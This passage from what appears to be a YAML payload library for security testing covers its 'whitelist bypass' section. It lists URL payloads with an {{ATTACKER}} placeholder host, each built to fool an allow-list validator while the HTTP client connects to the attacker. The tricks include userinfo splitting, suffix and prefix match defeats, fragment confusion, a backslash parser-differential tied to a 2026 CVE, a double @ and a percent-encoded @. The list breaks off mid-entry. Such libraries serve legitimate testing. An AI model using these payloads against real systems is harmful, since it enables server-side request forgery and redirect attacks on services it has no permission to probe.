  # ===========================================================================
  #  6. WHITELIST BYPASS
  #     Make the URL look like it goes to the expected host while actually
  #     routing to the attacker. Includes 2026 parser-differential CVEs.
  # ===========================================================================
  - id: "wl-001"
    name: "Userinfo splitting (classic)"
    category: "whitelist_bypass"
    payload: "http://expected-host@{{ATTACKER}}/"
    description: "Validator reads host as expected-host, HTTP client dials attacker."
    tags: ["whitelist_bypass", "userinfo", "classic"]
    severity_hint: "high"

  - id: "wl-002"
    name: "Reverse userinfo"
    category: "whitelist_bypass"
    payload: "http://{{ATTACKER}}@expected-host/"
    description: "Reverse — validator sees attacker, browser goes to expected."
    tags: ["whitelist_bypass", "userinfo"]
    severity_hint: "medium"

  - id: "wl-003"
    name: "Suffix-match defeat"
    category: "whitelist_bypass"
    payload: "http://expected-host.{{ATTACKER}}/"
    description: "endsWith('expected-host') passes, but authority is attacker."
    tags: ["whitelist_bypass", "suffix-match"]
    severity_hint: "high"

  - id: "wl-004"
    name: "Prefix-match defeat"
    category: "whitelist_bypass"
    payload: "http://{{ATTACKER}}?expected-host"
    description: "startswith('http://expected-host') passes on query confusion."
    tags: ["whitelist_bypass", "prefix-match"]
    severity_hint: "high"

  - id: "wl-005"
    name: "Fragment confusion"
    category: "whitelist_bypass"
    payload: "http://{{ATTACKER}}#expected-host"
    description: >
      expected-host in fragment — not sent to server, but validator
      sees it and passes the check.
    tags: ["whitelist_bypass", "fragment"]
    severity_hint: "high"

  - id: "wl-006"
    name: "Backslash authority (CVE-2026-67201)"
    category: "whitelist_bypass"
    payload: "http://expected-host\\@{{ATTACKER}}/"
    description: >
      Backslash before @ — parser differential between net.urllib
      and net.http (V language). Check reads expected-host, fetcher
      reads attacker.
    tags: ["whitelist_bypass", "backslash", "parser-differential", "2026"]
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2026-67201"]
    severity_hint: "critical"

  - id: "wl-007"
    name: "Double @"
    category: "whitelist_bypass"
    payload: "http://expected-host@@{{ATTACKER}}/"
    description: "Double @ — legacy parser confusion."
    tags: ["whitelist_bypass", "userinfo", "legacy"]
    severity_hint: "high"

  - id: "wl-008"
    name: "Percent-encoded @"
    category: "whitelist_bypass"
    payload: "http://expected-host%40{{ATTACKER}}/"
    description: "Percent-encoded @ — some parsers decode, some don't."
    tags: ["whitelist_bypass", "encoding"]
    severity_hint: "high"

  - id: "wl-009"
    name: "Unicode fullwidth @ (U+FF20)"
